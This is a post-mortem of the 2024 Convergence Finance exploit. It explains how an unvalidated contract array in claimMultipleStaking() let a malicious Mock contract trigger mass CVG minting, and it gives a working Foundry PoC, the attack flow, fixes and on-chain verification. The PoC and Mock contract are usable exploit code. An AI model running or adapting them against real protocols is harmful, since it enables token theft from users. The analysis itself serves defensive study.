# Convergence Finance — Unverified User Input Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-08-01 |
| **Protocol** | Convergence Finance (CVG) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$210,000 (60.06 WETH + 15,925 crvFRAX) |
| **Attacker** | [0x03560...E3aA](https://etherscan.io/address/0x03560a9d7a2c391fb1a087c33650037ae30de3aa) |
| **Attack Contract** | [0xee45...eB69](https://etherscan.io/address/0xee45384d4861b6fb422dfa03fbdcc6e29d7beb69) |
| **Attack Tx** | [0x636b...6f7](https://etherscan.io/tx/0x636be30e58acce0629b2bf975b5c3133840cd7d41ffc3b903720c528f01c65d9) |
| **Vulnerable Contract** | [CvxRewardDistributor (Proxy)](https://etherscan.io/address/0x2b083beaaC310CC5E190B1d2507038CcB03E7606) / [Implementation](https://etherscan.io/address/0x394f61d6a6198746abe784590218b4835279a5c9) |
| **Root Cause** | `claimMultipleStaking()` calls user-supplied arbitrary contract addresses without validation → malicious Mock contract returns inflated CVG reward amounts → unlimited CVG minting |
| **PoC Source** | [DeFiHackLabs — Convergence_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-08/Convergence_exp.sol) |

---

## 1. Vulnerability Overview

Convergence Finance is a reward distribution protocol integrated with the Convex Finance (CVX) ecosystem.
Users can claim CVG and CVX rewards through CVX staking positions.

The core vulnerability occurred in the `CvxRewardDistributor.claimMultipleStaking()` function.
This function iterates over a `claimContracts` array (a list of external contract addresses) passed directly by the caller and invokes the `claimCvgCvxMultiple()` callback on each entry without any validation.
The attacker inserted a **malicious Mock contract** into this array, which returned a manipulated CVG reward amount (`type(uint256).max - CVG.totalSupply()`).

The protocol trusted the return value as-is and minted **58,718,395 CVG (132% of the protocol's total supply at the time)** to the attacker's contract.
The attacker immediately dumped the tokens into the Curve CVGETH and CVGFRAX pools, acquiring 60.06 WETH and 15,925 crvFRAX.
As a result, the CVG token price collapsed by over 99%.

---

## 2. Vulnerable Code Analysis

### 2.1 Unvalidated External Contract Call (Core Vulnerability)

```solidity
// ❌ Vulnerable code — CvxRewardDistributor.claimMultipleStaking()
function claimMultipleStaking(
    ICvxStakingPositionService[] calldata claimContracts, // ❌ Arbitrary contract array supplied by the user
    address _account,
    uint256 _minCvgCvxAmountOut,
    bool _isConvert,
    uint256 cvxRewardCount
) external {
    uint256 totalCvgClaimable;
    ICommonStruct.TokenAmount[] memory totalCvxRewardsClaimable =
        new ICommonStruct.TokenAmount[](cvxRewardCount);

    for (uint256 i; i < claimContracts.length; ) {
        // ❌ Core vulnerability: no validation that claimContracts[i] is a legitimate
        //    staking contract recognized by the protocol — any attacker-deployed contract is called
        (uint256 cvgClaimable, ICommonStruct.TokenAmount[] memory cvxRewards) =
            claimContracts[i].claimCvgCvxMultiple(_account);
        
        // ❌ The returned cvgClaimable value is also not validated —
        //    the astronomical number returned by the malicious contract is accumulated as-is
        totalCvgClaimable += cvgClaimable;
        
        // ... cvxRewards processing logic
        unchecked { ++i; }
    }
    
    // ❌ CVG is minted for totalCvgClaimable without any validation
    if (totalCvgClaimable > 0) {
        cvg.mintRewards(_account, totalCvgClaimable);
    }
}
```

```solidity
// ✅ Fixed code — Whitelist-based contract validation
// Registry of legitimate staking contracts registered by the admin
mapping(address => bool) public approvedStakingContracts;

function claimMultipleStaking(
    ICvxStakingPositionService[] calldata claimContracts,
    address _account,
    uint256 _minCvgCvxAmountOut,
    bool _isConvert,
    uint256 cvxRewardCount
) external {
    uint256 totalCvgClaimable;
    ICommonStruct.TokenAmount[] memory totalCvxRewardsClaimable =
        new ICommonStruct.TokenAmount[](cvxRewardCount);

    for (uint256 i; i < claimContracts.length; ) {
        // ✅ Fix: only allow contracts registered in the whitelist
        require(
            approvedStakingContracts[address(claimContracts[i])],
            "CvxRewardDistributor: Unapproved staking contract"
        );
        
        (uint256 cvgClaimable, ICommonStruct.TokenAmount[] memory cvxRewards) =
            claimContracts[i].claimCvgCvxMultiple(_account);
        
        // ✅ Optional addition: upper-bound validation on return value (e.g., prevent exceeding max mintable amount)
        require(cvgClaimable <= MAX_CVG_PER_CLAIM, "CvxRewardDistributor: Reward amount exceeded");
        
        totalCvgClaimable += cvgClaimable;
        unchecked { ++i; }
    }
    
    if (totalCvgClaimable > 0) {
        cvg.mintRewards(_account, totalCvgClaimable);
    }
}
```

**Issue**: The `claimContracts` array is a parameter that can be freely manipulated by an external caller. The protocol never validates whether each element is a legitimate staking service within the Convergence ecosystem — via a whitelist or registry. Therefore, if an attacker passes an arbitrarily implemented contract, that contract's `claimCvgCvxMultiple()` return value is used directly as the mint amount.

---

### 2.2 Malicious Mock Contract — Inflated Reward Return

```solidity
// ❌ Mock contract deployed by the attacker
contract Mock {
    IERC20 CVG = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);

    // Pretends to implement claimCvgCvxMultiple(),
    // but actually returns a manipulated value back-calculated from the CVG total supply
    function claimCvgCvxMultiple(
        address account
    ) external returns (uint256, ICommonStruct.TokenAmount[] memory) {
        ICommonStruct.TokenAmount[] memory tokenAmount =
            new ICommonStruct.TokenAmount[](0);

        // ❌ Returns type(uint256).max - CVG.totalSupply()
        // → When the protocol mints this value as-is, CVG total supply increases dramatically
        // → On-chain result: 58,718,395 CVG minted (132% of total supply at time of attack)
        return (type(uint256).max - CVG.totalSupply(), tokenAmount);
    }
}
```

**Why return `type(uint256).max - totalSupply()`?**

The CVG contract's `mintRewards()` is presumed to contain clamp logic that prevents the total supply from exceeding a certain cap (`MAX_SUPPLY`). By requesting `type(uint256).max - totalSupply()`, the attacker aimed to receive the maximum amount permitted by that clamp (i.e., the remaining capacity up to the cap). The amount actually minted on-chain was 58,718,395 CVG, which represents 132.7% of the total supply at the time (44,258,674 CVG).

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker executed the attack without any prior funds or flash loans.
- The Mock contract is created internally when the attack contract (0xee45...eB69) is deployed.
- The Mock logic is included inline in the `input` data of the attack contract (per deployment bytecode analysis).

### 3.2 Execution Phase

```
Step 1: Deploy attack contract (including Mock)
Step 2: Call claimMultipleStaking([Mock], this, 1, true, 1)
Step 3: Mock.claimCvgCvxMultiple() → returns type(uint256).max - totalSupply
Step 4: CVG.mintRewards(attackContract, 58,718,395 CVG) executed
Step 5: Dump CVG into CVGETH pool → acquire WETH
Step 6: Dump CVG into CVGFRAX pool → acquire crvFRAX
Step 7: Transfer WETH and crvFRAX to attacker EOA
```

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│  Attacker EOA (0x03560...E3aA)                                       │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ Deploy attack contract (including Mock)
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Attack Contract (0xee45...eB69)                                     │
│  ┌──────────────────────────────────────────────────────────────┐   │
│  │  Mock Contract                                               │   │
│  │  claimCvgCvxMultiple() → type(uint256).max - totalSupply()  │   │
│  └──────────────────────────────────────────────────────────────┘   │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ claimMultipleStaking([Mock], ...)
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│  CvxRewardDistributor (0x2b08...7606) [Vulnerable Contract]          │
│                                                                      │
│  for claimContract in [Mock]:                                        │
│    ❌ No contract validation                                          │
│    cvgClaimable = Mock.claimCvgCvxMultiple() ──────────────────────▶│
│    │                                    ← returns 58,718,395 CVG    │
│    totalCvgClaimable += cvgClaimable                                 │
│                                                                      │
│  CVG.mintRewards(attackContract, 58,718,395 CVG)                    │
└──────────────────────────────┬──────────────────────────────────────┘
                               │ 58,718,395 CVG minted
                               ▼
┌─────────────────────────────────────────────────────────────────────┐
│  CVG Token Contract (0x97ef...7be8)                                  │
│  mintRewards() → 58,718,395 CVG issued (total supply increased 132%) │
└──────────────┬────────────────────────────────┬─────────────────────┘
               │ approve + exchange              │ approve + exchange
               ▼ 52,846,555 CVG                 ▼ 5,871,839 CVG
┌──────────────────────────┐      ┌──────────────────────────────────┐
│  Curve CVGETH Pool       │      │  Curve CVGFRAX Pool               │
│  (0x004C...9B2)          │      │  (0xa7B0...3e42)                  │
│  CVG dump (30.9x pool)   │      │  CVG dump                         │
└──────────────┬───────────┘      └──────────────┬───────────────────┘
               │ 60.06 WETH                        │ 15,925 crvFRAX
               ▼                                   ▼
┌─────────────────────────────────────────────────────────────────────┐
│  Attacker EOA (0x03560...E3aA)                                       │
│  Final profit: 60.06 WETH (~$150,146) + 15,925 crvFRAX (~$15,925)  │
│  Total: ~$166,071 (reported loss ~$210,000 — includes CVG price      │
│         crash damage)                                                │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.4 Outcome

| Item | Value |
|------|------|
| CVG Minted | 58,718,395 CVG (132% of total supply) |
| CVG Total Supply (pre-attack) | 44,258,674 CVG |
| CVG Total Supply (post-attack) | 102,977,069 CVG |
| WETH Acquired | 60.0583 WETH (~$150,146) |
| crvFRAX Acquired | 15,925.23 crvFRAX (~$15,925) |
| Direct Theft Total | ~$166,071 |
| CVG Price Collapse | ~99% (CVG liquidity in CVGETH pool increased 30.9x) |
| Reported Total Damage | ~$210,000 |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// @KeyInfo -- Total Lost : ~200k USD
// TX : https://etherscan.io/tx/0x636be30e58acce0629b2bf975b5c3133840cd7d41ffc3b903720c528f01c65d9
// Original Attacker: https://etherscan.io/address/0x03560a9d7a2c391fb1a087c33650037ae30de3aa

// [Step 1] Define interface for the vulnerable function
// The claimContracts array can be freely passed from the outside → root source of the vulnerability
interface ICvxRewardDistributor {
    function claimMultipleStaking(
        ICvxStakingPositionService[] calldata claimContracts, // ❌ Unvalidated external contract array
        address _account,
        uint256 _minCvgCvxAmountOut,
        bool _isConvert,
        uint256 cvxRewardCount
    ) external;
}

contract ContractTest is Test {
    ICvxRewardDistributor cvxRewardDistributor =
        ICvxRewardDistributor(0x2b083beaaC310CC5E190B1d2507038CcB03E7606);
    IERC20 CVG = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);
    // Curve CVGETH pool — swap CVG for WETH
    ICurveTwocryptoOptimized CVGETH =
        ICurveTwocryptoOptimized(0x004C167d27ADa24305b76D80762997Fa6EB8d9B2);
    // Curve CVGFRAX pool — swap CVG for crvFRAX
    ICurveTwocryptoOptimized CVGFRAX =
        ICurveTwocryptoOptimized(0xa7B0E924c2dBB9B4F576CCE96ac80657E42c3e42);

    function testExploit() external {
        // [Step 2] Deploy malicious Mock contract
        Mock mock = new Mock();

        // [Step 3] Insert Mock contract into the claimContracts array
        ICvxStakingPositionService[] memory claimContracts =
            new ICvxStakingPositionService[](1);
        claimContracts[0] = ICvxStakingPositionService(address(mock));

        // [Step 4] Execute attack — induce CVG minting using the inflated amount returned by Mock
        // _minCvgCvxAmountOut=1, _isConvert=true, cvxRewardCount=1
        cvxRewardDistributor.claimMultipleStaking(
            claimContracts, address(this), 1, true, 1
        );

        // [Step 5] Verify minted CVG balance (58,718,395 CVG)
        uint256 cvg_bal = CVG.balanceOf(address(this));
        emit log_named_decimal_uint("[Attack complete] CVG balance", cvg_bal, 18);
        // In the actual attack, CVG was subsequently sold into Curve pools for WETH/crvFRAX
    }
}

// [Core] Malicious Mock contract
// Pretends to implement the legitimate ICvxStakingPositionService interface
// but actually returns a manipulated CVG claim amount
contract Mock {
    IERC20 CVG = IERC20(0x97efFB790f2fbB701D88f89DB4521348A2B77be8);

    function claimCvgCvxMultiple(
        address account
    ) external returns (uint256, ICommonStruct.TokenAmount[] memory) {
        ICommonStruct.TokenAmount[] memory tokenAmount =
            new ICommonStruct.TokenAmount[](0);

        // ❌ Core manipulation: returns type(uint256).max - CVG.totalSupply()
        // The protocol's internal clamp logic determines the actual maximum mintable amount
        // On-chain result: 58,718,395 CVG minted (132% of total supply)
        return (type(uint256).max - CVG.totalSupply(), tokenAmount);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Unverified User Input (arbitrary contract call) | CRITICAL | CWE-20 |
| V-02 | Acceptance of return values from untrusted external contracts | CRITICAL | CWE-345 |
| V-03 | Unlimited token minting (access control bypass) | CRITICAL | CWE-284 |
| V-04 | Missing upper-bound validation on reward return values | HIGH | CWE-1284 |

### V-01: Unverified User Input (Arbitrary Contract Call)

- **Description**: The `claimContracts` parameter in `claimMultipleStaking()` is an array fully controlled by the caller. The protocol never validates whether each element is a legitimate Convergence staking service through a whitelist or registry. This is a textbook case of CWE-20 (Improper Input Validation).
- **Impact**: An attacker can designate a contract with arbitrary logic as the callback target → returns manipulated reward amounts → unlimited CVG minting.
- **Attack Condition**: Access to the `claimMultipleStaking()` function (permissionless — callable by anyone).

### V-02: Acceptance of Return Values from Untrusted External Contracts

- **Description**: The return value of the `claimCvgCvxMultiple()` callback is used as the mint amount without validation. An astronomical value such as `type(uint256).max - totalSupply()` returned by the attacker is accumulated as-is.
- **Impact**: Complete bypass of reward calculation logic → destruction of the protocol's CVG inflation mechanism.
- **Attack Condition**: Same as V-01 (only occurs when an arbitrary contract can be registered).

### V-03: Unlimited Token Minting (Access Control Bypass)

- **Description**: `CVG.mintRewards()` is designed to be callable only by `CvxRewardDistributor`, but due to the lack of input validation within that distributor, effectively anyone can trigger CVG minting.
- **Impact**: A single attack increased CVG total supply to 232%, causing catastrophic dilution for existing holders.
- **Attack Condition**: V-01 and V-02 vulnerabilities must be present.

### V-04: Missing Upper-Bound Validation on Reward Return Values

- **Description**: Even if a whitelist check existed, there is no secondary line of defense for the case where a registered staking contract returns an inflated value due to a bug or attack.
- **Impact**: A single vulnerable staking contract can affect the entire CVG supply.
- **Attack Condition**: Requires a separate bug in a registered staking contract.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Whitelist-based staking contract validation
// Maintain a whitelist that only admins can add to or remove from
mapping(address => bool) public approvedStakingContracts;

event StakingContractApproved(address indexed stakingContract, bool approved);

function setApprovedStakingContract(
    address stakingContract,
    bool approved
) external onlyOwner {
    approvedStakingContracts[stakingContract] = approved;
    emit StakingContractApproved(stakingContract, approved);
}

function claimMultipleStaking(
    ICvxStakingPositionService[] calldata claimContracts,
    address _account,
    uint256 _minCvgCvxAmountOut,
    bool _isConvert,
    uint256 cvxRewardCount
) external {
    uint256 totalCvgClaimable;
    // ...

    for (uint256 i; i < claimContracts.length; ) {
        // ✅ Added validation: whitelist check
        require(
            approvedStakingContracts[address(claimContracts[i])],
            "CvxRewardDistributor: Unapproved staking contract"
        );

        (uint256 cvgClaimable, ...) = claimContracts[i].claimCvgCvxMultiple(_account);
        totalCvgClaimable += cvgClaimable;
        unchecked { ++i; }
    }
    // ...
}
```

```solidity
// ✅ Fix 2: Upper-bound validation on return values (defense in depth)
// Set maximum CVG mint limit per single claim
uint256 public constant MAX_CVG_PER_EPOCH = 1_000_000 ether; // e.g., max 1M CVG per epoch

function claimMultipleStaking(...) external {
    uint256 totalCvgClaimable;
    // ...
    for (...) {
        require(approvedStakingContracts[address(claimContracts[i])], "Unapproved contract");
        (uint256 cvgClaimable, ...) = claimContracts[i].claimCvgCvxMultiple(_account);
        
        // ✅ Check individual value upper bound before accumulation
        require(cvgClaimable <= MAX_CVG_PER_EPOCH, "Single claim CVG limit exceeded");
        totalCvgClaimable += cvgClaimable;
        unchecked { ++i; }
    }
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Arbitrary contract call | Instead of accepting `claimContracts` as a parameter, switch to managing the list of registered contracts internally within the protocol |
| V-02: Unvalidated return values | Store the maximum claimable CVG per staking service in an on-chain registry and revert if exceeded |
| V-03: Minting authority | Add a separate access control layer to `CVG.mintRewards()` calls; ensure internal validation is complete within the distributor contract before minting |
| V-04: Return value upper bound | Set a protocol-wide CVG epoch emission cap and a per-single-claim cap |
| General | Before using external call results as inputs to critical operations such as minting/transfers, always apply multi-layer validation (CWE-20, CWE-345) |

---

## 7. Lessons Learned

1. **Never trust user-supplied contract addresses**: The pattern of using an externally provided contract address directly as a callback target carries the risk of arbitrary code execution. All external contract addresses must be permitted only from a whitelist explicitly registered at deployment time or through governance.

2. **Never trust return values from external contracts**: Even for registered contracts, validate whether the return value falls within an economically reasonable range. Values used as inputs to critical logic — particularly token minting, transfers, and price calculations — must be validated for upper bounds, lower bounds, and type correctness.

3. **Defense depth for minting authority**: Even if access control is applied to a token minting function, it is meaningless if the input validation within the contract holding that access right is weak. Minting authority architecture must be designed with the entire call chain in mind.

4. **Risks of reward aggregation logic**: Logic that aggregates rewards from multiple sources depends on the trustworthiness of each individual source. Each source must be independently validated, and a maximum contribution limit per source must be established.

5. **Importance of upgrades in proxy patterns**: This vulnerability could theoretically be patched via the upgradeable proxy pattern. Upgrade procedures and emergency pause mechanisms should be prepared in advance to enable rapid response when critical vulnerabilities emerge.

6. **Additional validation required when integrating with the Convex ecosystem**: In environments with multiple staking services such as the CVX/CVG ecosystem, it is safer to use a registry or factory pattern that can identify the legitimacy of each service.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Mock returned CVG claim amount | `type(uint256).max - totalSupply()` | `≈ 1.158e77` (theoretical) → internal clamp applied | ✅ |
| Actual CVG minted | Log output value | 58,718,395.06 CVG | ✅ |
| WETH acquired (CVGETH pool) | — | 60.0583 WETH | ✅ |
| crvFRAX acquired (CVGFRAX pool) | — | 15,925.23 crvFRAX | ✅ |
| CVG total supply (pre-attack) | — | 44,258,674.40 CVG | ✅ |
| CVG total supply (post-attack) | — | 102,977,069.45 CVG | ✅ |
| Attack block | 20,434,450 | 20,434,450 | ✅ |

### 8.2 On-Chain Event Log Sequence (Block 20,434,450)

| # | Event | Token | From | To | Amount |
|---|--------|------|------|-----|------|
| 00 | Transfer (mint) | CVG | 0x0000 | AttackContract | 58,718,395.06 CVG |
| 01 | Approval | CVG | AttackContract | CVGETH Pool | 52,846,555.55 CVG |
| 02 | Approval | CVG | AttackContract | CVGETH Pool | 0 (reset) |
| 03 | Transfer (sell) | CVG | AttackContract | CVGETH Pool | 52,846,555.55 CVG |
| 04 | Transfer (receive) | WETH | CVGETH Pool | Attacker EOA | 60.0583 WETH |
| 05 | Event (exchange) | CVGETH Pool | — | — | sig: 0x143f1f8e |
| 06 | Approval | CVG | AttackContract | CVGFRAX Pool | 5,871,839.51 CVG |
| 07 | Approval | CVG | AttackContract | CVGFRAX Pool | 0 (reset) |
| 08 | Transfer (sell) | CVG | AttackContract | CVGFRAX Pool | 5,871,839.51 CVG |
| 09 | Transfer (receive) | crvFRAX | CVGFRAX Pool | Attacker EOA | 15,925.23 crvFRAX |
| 10 | Event (exchange) | CVGFRAX Pool | — | — | sig: 0xb2e76ae9 |

### 8.3 Pre-condition Verification (Block 20,434,449, Immediately Before Attack)

| Item | Value | Notes |
|------|-----|------|
| Attacker EOA CVG balance | 0 CVG | No prior CVG holdings required |
| CvxRewardDistributor CVG balance | 0 CVG | No CVG held in Distributor |
| CVGETH pool CVG balance | 1,709,066.33 CVG | CVG increased 30.9x in pool after attack |
| CVG total supply | 44,258,674.40 CVG | Increased to 102,977,069.45 CVG after attack |
| Flash loan used | None | Attack executable without any prior funds |
| Attack contract type | CREATE (contract) | Attack executed simultaneously with deployment |

> **Note**: `CvxRewardDistributor` uses the EIP-1967 proxy pattern, and the implementation address is [0x394f...279a5c9](https://etherscan.io/address/0x394f61d6a6198746abe784590218b4835279a5c9).